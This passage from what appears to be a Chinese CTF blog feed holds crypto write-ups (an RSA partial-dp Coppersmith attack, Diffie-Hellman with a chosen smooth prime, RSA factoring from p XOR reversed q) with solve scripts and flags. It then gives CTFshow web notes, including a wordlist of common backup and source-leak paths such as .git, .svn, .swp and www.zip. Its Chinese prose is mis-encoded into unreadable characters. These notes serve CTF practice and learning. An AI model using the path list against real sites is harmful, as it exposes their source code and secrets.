<p>è¿™  å±äºè„‘æ´é¢˜äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> ct</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">b64table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">h = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> ct:</span><br><span class="line">    h += b64table[c.bit_length() - <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">flag = b64decode(h)</span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">&quot;ISITDTU&#123;r1c3_che55b0ard_4nd_bs64&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>


<h1 id="KAPO2019"><a href="#KAPO2019" class="headerlink" title="KAPO2019"></a>KAPO2019</h1><h2 id="Lenstra-Lenstra-Lovasz"><a href="#Lenstra-Lenstra-Lovasz" class="headerlink" title="Lenstra-Lenstra-LovÃ¡sz"></a>Lenstra-Lenstra-LovÃ¡sz</h2><p>task.sage</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long <span class="keyword">as</span> b2l</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>():</span><br><span class="line">    p = random_prime(<span class="number">2</span> ** <span class="number">1024</span>)</span><br><span class="line">    q = random_prime(<span class="number">2</span> ** <span class="number">1024</span>)</span><br><span class="line">    e = random_prime(<span class="number">200</span>, <span class="literal">False</span>, <span class="number">150</span>)</span><br><span class="line">    d = inverse_mod(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    n = p * q</span><br><span class="line">    <span class="keyword">return</span> [n, e, p, q, d]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n, e, p, q, d = generate()</span><br><span class="line">    key = [n, e, p, q, d]</span><br><span class="line"></span><br><span class="line">    flag = b2l(<span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>).read())</span><br><span class="line">    ct = <span class="built_in">pow</span>(flag, e, n)</span><br><span class="line"></span><br><span class="line">    secret = d % (p-<span class="number">1</span>)</span><br><span class="line">    bits = secret.nbits()</span><br><span class="line">    bias = bits // <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    secret = secret &gt;&gt; (bits//<span class="number">2</span> - bias)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (n, e, secret)</span><br><span class="line">    <span class="built_in">print</span> (ct)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>enc.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(6455822262099728871488017333002213763928974244728225916053004114762757288446279146632134559883137763509202760259665317867526185880602417384903035043373123172755205541848380033846647830559956562300790213183285570408285813940654388322823643901338114411098146713766948059574036750169834145669828812062836846441826158939413816441792342997972511615875337134161543579227974534136317577528234543157933263750295100350176275449872173516777290564027194224977405688960141636944708509979113636374750606901261856017099651198201404715950047463077544354559113250673461981023710617386807665904679700243253715051955720384474605996461, 42209220078437574866361422834065152842384701674177020659394975551630638228773791512185847142423481006715264054186715352545791966183624550240806137742117804368809490341638374030752315967)</span><br><span class="line">5283729370502224111594887226837880395316054773227004499787302073503878519636633822827217253857874355522588395812835740811362707153363560194601186826283559964747701769601487977762111123819420098096415036853595000842267748990264765099199777366178415275775930611456486254983609977806288992648707705283164998069127159450643405479857352132413567941113596062821699046442601516070886895831454313645493977658887986960438243972899363731335524071661232212596476620001731293273701784412244890405468701582192239044191141716454262551899911176914268204608240121498434944371667705131307108367792229003968794133948069333063516311066</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>emmm e&#x3D;151<br>dpé«˜ä½æ³„éœ² æœäº†ä¸€åœˆå‘ç°éƒ½æ˜¯ä»è¿™ä½<a href="https://github.com/pcw109550/write-up/tree/master/2019/KAPO/Lenstra-Lenstra-Lovasz" target="_blank">ä½¬</a>è¿™é‡Œå¼€å§‹çš„ orz ç›´æ¥è·Ÿç€sourceå­¦ä¹ å§<br>è®°å½•ä¸€ä¸‹æ¨å¯¼è¿‡ç¨‹:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dp === d % p-1</span><br><span class="line">d == dp+k1*(p-1)</span><br><span class="line">e*d == k2*(p-1)*(q-1)+1</span><br><span class="line">=&gt; e*(dp+k1*(p-1)) == k2*(p-1)*(q-1)+1</span><br><span class="line">mod p-1</span><br><span class="line">=&gt; e*dp === 1 mod p-1</span><br><span class="line">=&gt; e*dp == _k*(p-1)+1</span><br><span class="line">mod p (â€»)</span><br><span class="line">=&gt; e*dp+k_-1 === 0 mod p</span><br><span class="line">notice that e*dp == _k*(p-1)+1 and dp&lt;p-1</span><br><span class="line">=&gt; _k&lt;e (å’Œdpæ³„éœ²åŸç†ä¸€æ ·!)</span><br><span class="line">so we can enumerate _k from 1 to e</span><br><span class="line">to use coppersmith (for the reason that unknown bits&lt;=410 and beta=1/2, so we can find small roots &lt; N**1/4(512bits))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">(n, secret) = (<span class="number">6455822262099728871488017333002213763928974244728225916053004114762757288446279146632134559883137763509202760259665317867526185880602417384903035043373123172755205541848380033846647830559956562300790213183285570408285813940654388322823643901338114411098146713766948059574036750169834145669828812062836846441826158939413816441792342997972511615875337134161543579227974534136317577528234543157933263750295100350176275449872173516777290564027194224977405688960141636944708509979113636374750606901261856017099651198201404715950047463077544354559113250673461981023710617386807665904679700243253715051955720384474605996461</span>, <span class="number">42209220078437574866361422834065152842384701674177020659394975551630638228773791512185847142423481006715264054186715352545791966183624550240806137742117804368809490341638374030752315967</span>)</span><br><span class="line">ct = <span class="number">5283729370502224111594887226837880395316054773227004499787302073503878519636633822827217253857874355522588395812835740811362707153363560194601186826283559964747701769601487977762111123819420098096415036853595000842267748990264765099199777366178415275775930611456486254983609977806288992648707705283164998069127159450643405479857352132413567941113596062821699046442601516070886895831454313645493977658887986960438243972899363731335524071661232212596476620001731293273701784412244890405468701582192239044191141716454262551899911176914268204608240121498434944371667705131307108367792229003968794133948069333063516311066</span></span><br><span class="line">e = <span class="number">151</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">k</span>):</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    f = e*((secret*<span class="number">2</span>**<span class="number">410</span>)+x)+k-<span class="number">1</span></span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^<span class="number">409</span>,beta=<span class="number">0.4</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;dp= <span class="subst">&#123;secret*<span class="number">2</span>**<span class="number">409</span>+roots[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;=================================&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e):</span><br><span class="line">    attack(k)</span><br><span class="line"><span class="comment"># dp= 111610627483329456042773469243525292052790452506522007088578106283136307535942428003600535113613729808907790947325623821175745420979563394756953617513882387710361103999394612618576932519125987576858649069903834459634170735915011161895680193594023143108156113045675433885394403477072411701711342985242940069663</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ç„¶åå°±æ˜¯ç®€å•çš„dpæ³„éœ²é¢˜ç›®äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span>((dp*e-<span class="number">1</span>+k)%k==<span class="number">0</span>):</span><br><span class="line">        p = (dp*e-<span class="number">1</span>+k)//k</span><br><span class="line">        q = n//p</span><br><span class="line">        <span class="keyword">if</span>(p*q==n):</span><br><span class="line">            <span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">            <span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line">            d = modinv(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(ct,d,n)))</span><br></pre></td></tr></table></figure>

<p>flag: POKA{You_4r3_Crypt0_N00000B_XDD}</p>
<p>è¿™ä½ä½¬çœŸçš„tql orz</p>
<h1 id="moeCTF2023"><a href="#moeCTF2023" class="headerlink" title="moeCTF2023"></a>moeCTF2023</h1><h2 id="flag-exchange"><a href="#flag-exchange" class="headerlink" title="flag_exchange"></a>flag_exchange</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">    flag = fs.read().strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">diffie_hellman</span>(<span class="params">p, flag</span>):</span><br><span class="line">    alice_privKey = getrandbits(<span class="number">1024</span>)</span><br><span class="line">    alice_pubKey = <span class="built_in">pow</span>(<span class="number">7</span>, alice_privKey, p)</span><br><span class="line">    bob_privKey = getrandbits(<span class="number">1024</span>)</span><br><span class="line">    bob_pubKey = <span class="built_in">pow</span>(<span class="number">7</span>, bob_privKey, p)</span><br><span class="line"></span><br><span class="line">    superkey = <span class="built_in">pow</span>(bob_pubKey, alice_privKey, p)</span><br><span class="line">    m = <span class="built_in">int</span>.from_bytes(flag, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> (m * superkey) % p, alice_pubKey, bob_pubKey</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Callable</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chall</span>(<span class="params"><span class="built_in">input</span>:<span class="type">Callable</span>[[<span class="built_in">str</span>],<span class="literal">None</span>], <span class="built_in">print</span>:<span class="type">Callable</span>[[<span class="built_in">str</span>],<span class="literal">None</span>]</span>):</span><br><span class="line">    p = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;P = &quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> isPrime(p) <span class="keyword">and</span> p.bit_length() &gt;= <span class="number">1024</span>:</span><br><span class="line">        c, alice_pubKey, bob_pubKey = diffie_hellman(p, flag)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Alice&#x27;s public key: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(alice_pubKey))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Bob&#x27;s public key: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(bob_pubKey))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Ciphertext: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(c))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Invalid P&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>ç»™ä¸€ä¸ªPä¿è¯P-1å…‰æ»‘ è¿™æ ·ç¦»æ•£å¯¹æ•°ç›´æ¥æ±‚å°±è¡Œäº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> modinv</span><br><span class="line">p = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sieve_base)):</span><br><span class="line">    p*=sieve_base[i]</span><br><span class="line">    <span class="keyword">if</span>(p.bit_length()&gt;=<span class="number">1024</span> <span class="keyword">and</span> isPrime(p+<span class="number">1</span>)):</span><br><span class="line">        <span class="built_in">print</span>(p+<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">20404068993016374194542464172774607695659797117423121913227131032339026169175929902244453757410468728842929862271605567818821685490676661985389839958622802465986881376139404138376153096103140834665563646740160279755212317501356863003638612390661668406235422311783742390510526587257026500302696834793248526734305801634165948702506367176701233298064616663553716975429048751575597150417381063934255689124486029492908966644747931</span></span><br><span class="line">A = <span class="number">10535907278790700538391290444921305217259385431263711692801040936511190666531116700305186920599844299554256714210210829717476920248418057857281038962186002736577757264399457937073280966879708966646259512918943865328709139377854814605040022146158670388299143718823490062168338902733222126015956430817934114854967961103604652093740121364332358685392900872098860796503201407589428414466539049626631184008892730055415169100769732</span></span><br><span class="line">B = <span class="number">16348489331356867301630771825154767170233294861057688783357728790213156540287376598857687580984409669161724312800129242584879634810196465793194307910350584763235456209835940884693137265638231235038196296978539087935504760585844080798763164306369527171514584826163061235753126778212519635905807390933273873667058848266096108542464516152013945119362646618506147214283108243842818817447082449655146411335921417161043077611902804</span></span><br><span class="line">c = <span class="number">7632994523412492260557179922189823901916021592995792231423394289817118356542879338257864183368725535825022550174733859623962587355640726058879305520054662785703521463831735133391030853928379496146944314205140328897640874120866187629354584127754485292965951151063241820133235042448633627434068969391854258102614435821987664948230501326316243932358798360818637206571054067460923260493428092446138441830565932807827179355927283</span></span><br><span class="line"><span class="comment"># _A = discrete_log(mod(A,p),mod(7,p))</span></span><br><span class="line"><span class="comment"># _super = pow(B,_A,p)</span></span><br><span class="line"></span><br><span class="line">_<span class="built_in">super</span> = <span class="number">5598697508050553831301016186451810766892175075227457781663609137315994994339946099771767989549360029474161927222425134451542335224836812568338804744981790630968653314082988409623033093913313149007040705162350558420312224001860502897319860524983780294087905883722904658909173858938483002561143035786870483434405455082101246235125472463011482817487767144926351669559368591298053399981071648084262851031724505873554319182541246</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(modinv(_<span class="built_in">super</span>,p)*c%p))</span><br><span class="line"><span class="comment"># moectf&#123;diffie_he11man_key_exChange_is_not_so_hard_2WPIBung92WPIBung9?WP&#125;</span></span><br></pre></td></tr></table></figure>


<h1 id="miniLCTF2021"><a href="#miniLCTF2021" class="headerlink" title="miniLCTF2021"></a>miniLCTF2021</h1><h2 id="asr"><a href="#asr" class="headerlink" title="asr"></a>asr</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(bytes_to_long(flag) , e , n))</span><br><span class="line">_q = <span class="built_in">int</span>(<span class="built_in">bin</span>(q)[<span class="number">2</span>:][::-<span class="number">1</span>] , <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(p ^ _q)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">142640215238537871365683719891541306935180737226071087966538112975312943506714964164341655541156886519552359173518384366335764339838818638439617545046906731685628758140658162759582216079833807742803333237267119228131836589616600586722503125595590784393805677472708123448256012705645099262323873911736910168311</span></span><br><span class="line"><span class="string">141992115210477059329798383810995602331919683555539663737474122431362785313684902184569357178889736223104558359787247242121836892146092641430333220915928891299001128364434856756544237628623127350186698031711524123158225428351095110283324920060240308834304841350657100420648385312630518518518978998617676378512</span></span><br><span class="line"><span class="string">2687108833541074884027968939992825896836389810177573543799115292760866858835988113613745599976930175463756036625174575759254321939315015594803646458939874</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜å­¦åˆ°äº†ä¸€ç§æœç´¢æŠ€å·§ é«˜ä½ä½ä¸€èµ·dfs<br>è´´ä¸ªä»£ç :</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    d =modinv(e,phi)</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(<span class="built_in">pow</span>(c,d,n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_p_q</span>():</span><br><span class="line">    p_low = [<span class="number">0</span>]</span><br><span class="line">    q_high = [<span class="number">0</span>]</span><br><span class="line">    q_low = [<span class="number">0</span>]</span><br><span class="line">    p_high = [<span class="number">0</span>]</span><br><span class="line">    maskx = <span class="number">1</span></span><br><span class="line">    maskn = <span class="number">2</span></span><br><span class="line">    si = <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        x_lowbits = (x &amp; maskx) &gt;&gt; i</span><br><span class="line">        n_lowbits = (n % maskn)</span><br><span class="line">        tmppp_low = []</span><br><span class="line">        tmpqq_low = []</span><br><span class="line">        tmppp_high =[]</span><br><span class="line">        tmpqq_high =[]</span><br><span class="line">        x_highbits = (x &gt;&gt; (<span class="number">511</span>-i)) &amp; <span class="number">1</span></span><br><span class="line">        n_highbits = (n)&gt;&gt; (<span class="number">1022</span> - <span class="number">2</span>*i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p_low)):</span><br><span class="line">            <span class="keyword">for</span> pp_low <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">for</span> qq_low <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                    <span class="keyword">for</span> pp_high <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                        <span class="keyword">for</span> qq_high <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                            <span class="keyword">if</span> pp_low ^ qq_high == x_lowbits <span class="keyword">and</span> qq_low ^ pp_high == x_highbits:</span><br><span class="line">                                temp1 = ((pp_low * maskn //<span class="number">2</span> + p_low[j]) * (qq_low * maskn // <span class="number">2</span> + q_low[j])) % maskn </span><br><span class="line">                                temp2 = (((pp_high &lt;&lt; (<span class="number">511</span>-i)) + p_high[j]) * ((qq_high &lt;&lt; (<span class="number">511</span>-i)) + q_high[j]))&gt;&gt;(<span class="number">1022</span>-<span class="number">2</span>*i)</span><br><span class="line">                                <span class="keyword">if</span> temp1 == n_lowbits :</span><br><span class="line">                                    <span class="keyword">if</span> n_highbits-temp2 &gt;= <span class="number">0</span>  <span class="keyword">and</span> n_highbits-temp2 &lt;=(<span class="number">2</span>&lt;&lt;i+<span class="number">1</span>):</span><br><span class="line">                                        tmppp_low.append(pp_low * maskn //<span class="number">2</span> + p_low[j])</span><br><span class="line">                                        tmpqq_low.append(qq_low * maskn //<span class="number">2</span> + q_low[j])</span><br><span class="line">                                        tmppp_high.append((pp_high&lt;&lt;(<span class="number">511</span>-i))+p_high[j])</span><br><span class="line">                                        tmpqq_high.append((qq_high&lt;&lt;(<span class="number">511</span>-i))+q_high[j])</span><br><span class="line"></span><br><span class="line">        maskn *= <span class="number">2</span></span><br><span class="line">        maskx *= <span class="number">2</span></span><br><span class="line">        p_low = tmppp_low</span><br><span class="line">        q_low = tmpqq_low</span><br><span class="line">        p_high = tmppp_high</span><br><span class="line">        q_high = tmpqq_high</span><br><span class="line">        <span class="built_in">print</span>(i,<span class="built_in">len</span>(p_low))</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> p_low:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> p_high:</span><br><span class="line">            <span class="keyword">if</span> n %(a+b) ==<span class="number">0</span>:</span><br><span class="line">                p = a + b</span><br><span class="line">                <span class="built_in">print</span>(p)</span><br><span class="line">                q = n//p</span><br><span class="line">                <span class="keyword">return</span> p,q</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    n = <span class="number">142640215238537871365683719891541306935180737226071087966538112975312943506714964164341655541156886519552359173518384366335764339838818638439617545046906731685628758140658162759582216079833807742803333237267119228131836589616600586722503125595590784393805677472708123448256012705645099262323873911736910168311</span></span><br><span class="line">    c = <span class="number">141992115210477059329798383810995602331919683555539663737474122431362785313684902184569357178889736223104558359787247242121836892146092641430333220915928891299001128364434856756544237628623127350186698031711524123158225428351095110283324920060240308834304841350657100420648385312630518518518978998617676378512</span></span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    x = <span class="number">2687108833541074884027968939992825896836389810177573543799115292760866858835988113613745599976930175463756036625174575759254321939315015594803646458939874</span> </span><br><span class="line">    p , q = get_p_q()</span><br><span class="line">    flag = get_flag()</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># miniLCTF&#123;reverse_1s_als0_e1sy&#125;</span></span><br></pre></td></tr></table></figure>
<p>è‡³äºä¸ºä»€ä¹ˆè¦é«˜ä½ä½ä¸€èµ·dfs è¿™æ ·çš„è¯é™åˆ¶æ›´å¤š æ›´èƒ½å……åˆ†åˆ©ç”¨p^reverse(q) çš„æ¡ä»¶</p>
<p>è¿™ä»£ç ç¡®å®å†™çš„æŒºæ£’çš„ å­¦ä¹ äº† orz</p>
]]></content>
      <categories>
        <category>CTF-Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>web-CTFshow</title>
    <url>/2023/12/04/web-CTFshow/</url>
    <content><![CDATA[<p>è®°è½½CTFshowä¸Šçš„webé¢˜ç›®(å°‘æ•°èƒ½å¤ç° å¤§å¤šéƒ½åªèƒ½çœ‹WP&#x2F;è§†é¢‘ æ¥ç§¯ç´¯æ€è·¯)</p>
<span id="more"></span>
<p><strong>æ„Ÿè°¢@L1Nk8ugå¸ˆå‚…å€Ÿæˆ‘å· ç»ˆäºå¯ä»¥å¤ç°äº†~</strong><br><a href="https://l-i-n-g-c-e-n-g.github.io/" target="_blank">å‹é“¾</a></p>
<h1 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h1><p>VIPé¢˜ç›®é™å…å‘~</p>
<h2 id="web1-æºç æ³„éœ²"><a href="#web1-æºç æ³„éœ²" class="headerlink" title="web1 æºç æ³„éœ²"></a>web1 æºç æ³„éœ²</h2><p>bpæŠ“åŒ…å¯ä»¥ç›´æ¥åœ¨responseçš„æºç çœ‹åˆ°flag</p>
<h2 id="web2-å‰å°JSç»•è¿‡"><a href="#web2-å‰å°JSç»•è¿‡" class="headerlink" title="web2 å‰å°JSç»•è¿‡"></a>web2 å‰å°JSç»•è¿‡</h2><p>az ç›´æ¥ctrl+uå°±çœ‹åˆ°flagäº†<br>æŸ¥çœ‹æºç å‘ç°ç¡®å®å°±æ˜¯jså‰ç«¯ä½œäº†å…¨éƒ¨return falseçš„å¤„ç† ä½†ä¸æ¯«ä¸å½±å“ ç¦ç”¨jsç­‰æ“ä½œéƒ½å¯ä»¥ç»•è¿‡</p>
<h2 id="web3-åè®®å¤´ä¿¡æ¯æ³„éœ²"><a href="#web3-åè®®å¤´ä¿¡æ¯æ³„éœ²" class="headerlink" title="web3 åè®®å¤´ä¿¡æ¯æ³„éœ²"></a>web3 åè®®å¤´ä¿¡æ¯æ³„éœ²</h2><p>bpæŠ“åŒ… ç„¶ååœ¨responseçœ‹åˆ°Flag:ä¸€æ ä¿¡æ¯å³ä¸ºflag</p>
<h2 id="web4-robotsåå°æ³„éœ²"><a href="#web4-robotsåå°æ³„éœ²" class="headerlink" title="web4 robotsåå°æ³„éœ²"></a>web4 robotsåå°æ³„éœ²</h2><p>ä¸€äº›å¸¸è§çš„å¤‡ä»½æ–‡ä»¶(ä»…é™äºæ‡’å¾—ç”¨dirsearchâ€¦)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.index.php.swp</span><br><span class="line">index.php.swp</span><br><span class="line">index.php.bak</span><br><span class="line">.index.php~</span><br><span class="line">index.php.bak_Edietplus</span><br><span class="line">index.php.~</span><br><span class="line">index.php<span class="number">.1</span></span><br><span class="line">index.php</span><br><span class="line">index.php~</span><br><span class="line">index.php.rar</span><br><span class="line">index.php.zip</span><br><span class="line">index.php<span class="number">.7</span>z</span><br><span class="line">index.php.tar.gz</span><br><span class="line">www.zip</span><br><span class="line">www.rar</span><br><span class="line">www.zip</span><br><span class="line">www<span class="number">.7</span>z</span><br><span class="line">www.tar.gz</span><br><span class="line">www.tar</span><br><span class="line">web.zip</span><br><span class="line">web.rar</span><br><span class="line">web.zip</span><br><span class="line">web<span class="number">.7</span>z</span><br><span class="line">web.tar.gz</span><br><span class="line">web.tar</span><br><span class="line">wwwroot.rar</span><br><span class="line">web.rar</span><br><span class="line">robots.txt</span><br><span class="line">index.phps</span><br></pre></td></tr></table></figure>
<p>ç»“åˆé¢˜ç›®æç¤º è®¿é—® &#x2F;robots.txt å¾—åˆ°flagçš„è·¯å¾„&#x2F;flagishere.txt è®¿é—®å³å¯</p>
<h2 id="web5-phpsæºç æ³„éœ²"><a href="#web5-phpsæºç æ³„éœ²" class="headerlink" title="web5 phpsæºç æ³„éœ²"></a>web5 phpsæºç æ³„éœ²</h2><p>phpsæºç  &#x2F;index.phps<br>å¹³æ—¶ä¸€èˆ¬çŒœ&#x2F;index.php è¿™é‡Œå‘Šè¯‰æˆ‘ä»¬æœ‰æ–°çš„ä¸€ç§.phps<br>è®¿é—®ä¸‹è½½æ–‡ä»¶ é‡Œé¢å³æœ‰flag</p>
<h2 id="web6-æºç å‹ç¼©åŒ…æ³„éœ²"><a href="#web6-æºç å‹ç¼©åŒ…æ³„éœ²" class="headerlink" title="web6 æºç å‹ç¼©åŒ…æ³„éœ²"></a>web6 æºç å‹ç¼©åŒ…æ³„éœ²</h2><p>å¸¸è§çš„ &#x2F;<a href="http://www.zip/">www.zip</a><br>ä¸‹è½½åå¾—åˆ°fl000g.txt<br>çŒœæƒ³è¿™æ˜¯flagè·¯å¾„ è®¿é—® &#x2F;fl000g.txt å¾—åˆ°flag</p>
<h2 id="web7-ç‰ˆæœ¬æ§åˆ¶æ³„éœ²æºç "><a href="#web7-ç‰ˆæœ¬æ§åˆ¶æ³„éœ²æºç " class="headerlink" title="web7 ç‰ˆæœ¬æ§åˆ¶æ³„éœ²æºç "></a>web7 ç‰ˆæœ¬æ§åˆ¶æ³„éœ²æºç </h2><p>.gitæ³„éœ²(æ‰€ä»¥å¹³æ—¶ç”¨gitè¦å°å¿ƒå•Š!!!)<br>è®¿é—® &#x2F;.git å¾—åˆ°flag</p>
<h2 id="web8-ç‰ˆæœ¬æ§åˆ¶æ³„éœ²æºç 2"><a href="#web8-ç‰ˆæœ¬æ§åˆ¶æ³„éœ²æºç 2" class="headerlink" title="web8 ç‰ˆæœ¬æ§åˆ¶æ³„éœ²æºç 2"></a>web8 ç‰ˆæœ¬æ§åˆ¶æ³„éœ²æºç 2</h2><p>åˆå­¦ä¹ åˆ°äº†æ–°å§¿åŠ¿<br>.svnæ³„éœ²<br>è®¿é—® &#x2F;.svn å¾—åˆ°flag<br>æ³¨: SVNæ˜¯ä¸€ä¸ªå¼€æ”¾æºä»£ç çš„ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿ(å¯å®ç°å¤šäººååŒå¼€å‘ &amp; â€¦)</p>
<h2 id="web9-vimä¸´æ—¶æ–‡ä»¶æ³„éœ²"><a href="#web9-vimä¸´æ—¶æ–‡ä»¶æ³„éœ²" class="headerlink" title="web9 vimä¸´æ—¶æ–‡ä»¶æ³„éœ²"></a>web9 vimä¸´æ—¶æ–‡ä»¶æ³„éœ²</h2><p>index.php.swp æ³„éœ²<br>vimä¸­çš„swpå³swap äº¤æ¢åˆ†åŒº åœ¨ç¼–è¾‘vimæ—¶ç”¨æ¥å¤‡ä»½ç¼“å†²åŒºå†…å®¹</p>
<h2 id="web10-cookieæ³„éœ²"><a href="#web10-cookieæ³„éœ²" class="headerlink" title="web10 cookieæ³„éœ²"></a>web10 cookieæ³„éœ²</h2><p>bpæŠ“åŒ… åœ¨requestä¸­çš„cookieæ å¾—åˆ°flag(åªæ˜¯ â€˜{â€˜å’Œâ€™}â€™è¢«urlç¼–ç äº†)</p>
